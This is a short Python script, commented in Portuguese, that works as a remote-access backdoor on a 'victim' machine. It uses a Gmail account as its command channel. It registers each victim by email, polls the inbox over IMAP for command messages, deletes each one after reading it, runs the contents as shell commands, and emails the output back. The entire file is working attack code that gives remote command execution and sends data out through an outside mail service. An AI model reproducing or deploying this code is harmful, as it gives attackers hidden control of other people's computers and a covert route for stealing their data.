import imaplib, email, random, smtplib, time, subprocess

while True:
    try:
        ID_vitima = str( random.random() ) #1

        login = "email@gmail.com"
        senha = "senha do Gmail"

        conexao_IMAP = imaplib.IMAP4_SSL('imap.gmail.com', 993)
        conexao_IMAP.login(login, senha)

        conexao_SMTP = smtplib.SMTP('smtp.gmail.com', 587)
        conexao_SMTP.starttls()
        conexao_SMTP.login(login, senha)

        FROM = login
        TO = login
        SUBJECT = "Vitima-%s" %ID_vitima
        CORPO = ""
        message = "From: %s\nTo: %s\nSubject: %s\n\n%s" % (FROM, TO, SUBJECT, CORPO)
        conexao_SMTP.sendmail(FROM, TO, message) #2

        while True:
            conexao_IMAP.select("inbox") #3
            UID = conexao_IMAP.uid("search", None, u'Subject "Requisicao-%s"' %ID_vitima)[1][0] #4
            if len(UID): #5
                conteudo_UID = conexao_IMAP.uid("fetch", UID, '(RFC822)' )[1][0][1] #6
                conexao_IMAP.uid("STORE", UID, "+FLAGS", "\\Deleted") #7
                comando = conteudo_UID.split("Subject: Requisicao-%s" %ID_vitima)[1].strip() #8
                cmd = subprocess.Popen(comando, shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE) #9
                SUBJECT = "Resposta-" + ID_vitima #10
                CORPO = cmd.stdout.read() + cmd.stderr.read() #11
                message = "From: %s\nTo: %s\nSubject: %s\n\n%s" % (FROM, TO, SUBJECT, CORPO)
                conexao_SMTP.sendmail(FROM, TO, message) #12

    except Exception:
        time.sleep(10)